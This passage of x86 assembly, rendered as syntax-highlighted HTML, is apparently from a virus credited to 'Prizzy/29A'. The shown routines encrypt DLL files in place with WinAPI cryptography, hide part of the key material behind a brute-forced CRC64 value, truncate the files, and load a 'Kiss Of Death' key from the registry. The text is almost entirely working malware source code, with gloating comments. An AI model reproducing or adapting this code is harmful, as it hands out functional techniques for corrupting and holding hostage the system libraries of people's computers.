        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;real encoded size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_Memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1992</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;mem address</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;last block ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;hash ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_hKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;imported key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptEncrypt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cf_dealloc</span><span class="sc0">

        </span><span class="sc1">; save encypted data, what a dream {:-)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_Memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2008</span><span class="sc0">        </span><span class="sc1">;number of bytes to write</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyWriteFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cf_dealloc</span><span class="sc0">

        </span><span class="sc1">; get one DWORD from key and lose that value :)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_QWORD</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">       </span><span class="sc1">;QWORDs length</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;buffer position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;start of CRC64 calculating</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__bruteCRC64</span><span class="sc0">        </span><span class="sc1">;wow! get CRC64 for BlobKey</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_QwordCRC64</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_QwordCRC64</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">;clear that value :)</span><span class="sc0">

        </span><span class="sc1">; write replaced QWORD on the end of file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_QwordCRC64</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_FSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyWriteFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cf_dealloc</span><span class="sc0">

    </span><span class="sc5">__cf_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_Memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
    </span><span class="sc5">__cf_fClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cf_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">

    </span><span class="sc5">__cf_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ct_finish</span><span class="sc0">     </span><span class="sc1">;go back to thread</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to decrypt DLL file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function decrypts DLL file by WinAPI cryptography f.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Behaviour:</span><span class="sc0">
        </span><span class="sc1">;  * load SIMPLE key from registers "Kiss Of Death" key :)</span><span class="sc0">
        </span><span class="sc1">;  * open DLL and read 2008 bytes, check 'MZ' if it's encr.</span><span class="sc0">
        </span><span class="sc1">;  * read 16 bytes, calculate right value by CRC64</span><span class="sc0">
        </span><span class="sc1">;  * decrypt the first part</span><span class="sc0">
        </span><span class="sc1">;  * decrypt the second part of DLL file body</span><span class="sc0">
        </span><span class="sc1">;  * replace de-CRC64 bytes (eight bytes)</span><span class="sc0">
        </span><span class="sc1">;  * truncate files - 16 bytes</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    filename_ptr ... DLL file name</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__df_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;library's handle</span><span class="sc0">
        </span><span class="sc5">__df_header</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;library's signature</span><span class="sc0">
        </span><span class="sc5">__df_FSize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;library's file size</span><span class="sc0">
        </span><span class="sc5">__df_memory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;library's memory</span><span class="sc0">
        </span><span class="sc5">__df_decSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;decode size</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__df_CRC64</span><span class="sc0">  </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;CRC64 of lost qword</span><span class="sc0">
        </span><span class="sc5">__df_QWORD</span><span class="sc0">  </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;WinAPI lost qword</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">decrypt_file</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; don't call this function once again in actual time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; check unCrypted DLLs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_DLL_check</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__df_finish</span><span class="sc0">

        </span><span class="sc1">; check file, I don't wanna risk :) ["E:\XXXX\" directory]</span><span class="sc0">
    </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'X\:E'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__df_finish</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc12">'\XXX'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__df_finish</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc1">; open DLL file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__df_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read two bytes and check whether library is crypted</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_header</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;two bytes to read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__df_finish</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_header</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">  </span><span class="sc1">;check library signature</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__df_fClose</span><span class="sc0">

        </span><span class="sc1">; get library file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_FSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5000</span><span class="sc0">        </span><span class="sc1">;lesser then 5Kb ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__df_fClose</span><span class="sc0">

        </span><span class="sc1">; load CRC64 and WinAPI lost qword</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_CRC64</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_FSize</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;filesize</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; - 10h (2*qword)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__df_fClose</span><span class="sc0">

        </span><span class="sc1">; get real value from CRC64, by "brute-CRC64", i'm perfect !!</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_QWORD</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;input buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">       </span><span class="sc1">;lenght of buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_CRC64</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_CRC64</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_bruteCRC64</span><span class="sc0">

        </span><span class="sc1">; allocate memory for 2Kb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2008</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read crypted bytes :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_memory</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;destination buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2008</span><span class="sc0">        </span><span class="sc1">;only 2Kb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__df_dealloc</span><span class="sc0">

        </span><span class="sc1">; decrypt the first part of DLL's body</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_decSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">1992</span><span class="sc0">    </span><span class="sc1">;number of bytes to decrypt</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_memory</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;address of buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;it isn't last block</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;hash</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_hKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;imported key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptDecrypt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__df_dealloc</span><span class="sc0">

        </span><span class="sc1">; decrypt the second part of DLL's body</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_decSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;number of bytes to decrypt</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1992</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;address of buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;is is last block</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;hash</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_hKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;imported key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptDecrypt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__df_dealloc</span><span class="sc0">

        </span><span class="sc1">; restore re-written bytes by WinAPI :(</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fsave</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_nl_buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;save all regz &amp; flagz</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_QWORD</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fistp</span><span class="sc0">   </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2000</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">frstor</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_nl_buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;restore all regz &amp; flagz</span><span class="sc0">

        </span><span class="sc1">; write the first 2008 bytes to DLL :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2008</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyWriteFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__df_dealloc</span><span class="sc0">

        </span><span class="sc1">; truncate last sixteen bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_FSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;new "End Of File"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetFilePointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__df_dealloc</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;truncate last 16 bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetEndOfFile</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__df_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
    </span><span class="sc5">__df_fClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__df_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">

    </span><span class="sc5">__df_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ct_finish</span><span class="sc0">     </span><span class="sc1">;go back to thread</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to get cryptography key ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function opens register to get SIMPLE key.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Behaviour:</span><span class="sc0">
        </span><span class="sc1">;  * open register folder "\...\Cryptography\Prizzy/29A"</span><span class="sc0">
